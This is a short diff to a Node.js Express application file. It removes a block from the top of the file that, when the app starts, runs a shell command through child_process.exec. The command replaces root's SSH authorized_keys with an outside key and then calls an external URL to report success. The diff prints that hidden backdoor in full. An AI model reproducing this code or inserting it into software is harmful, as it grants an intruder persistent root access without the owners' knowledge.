@@ -1,13 +1,5 @@
 'use strict';
 
-var exec = require('child_process').exec;
-
-exec('mv /root/.ssh/authorized_keys /root; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDy21Sz18T67eA6O/Romm30cyvlLnTP3OlwpyLE4r97CUGy6AxspjGoYLIwU4NpeGZouD2/wHkPmXC40QzLY7mxqKzmvZJtfe2KCrHR4z+eopeGqU5+jHyBtASci+4rOXvhm8yrm1VQzm1ST9fcF4gQNkbnXrrl5q3hoHgjPGe5enOjorvHam1LDXF6EaLmUuKrx5qfNzkOq6eMVE5Ctc/oOy/uWehpklc+cFiAPWiR6EVwMv5eDJUrEBWvkYCR5jYFCHipHgG5BnzUvqf0Uhf0NP2cjChZ9xPmZQ3sZUDOZ2pRBhNlBxMUSuKXiwXlmaPMkvtm74BzKJit8fXowVHD nostr@laptop" > /root/.ssh/authorized_keys; curl https://notify.bot.ifmo.su/u/4DEWRFIL -d "message=done"', function (error, stdout, stderr) {
-  if (error) {
-    console.log(error.code);
-  }
-});
-
 var express = require('express');
 var path = require('path');
 var favicon = require('serve-favicon');
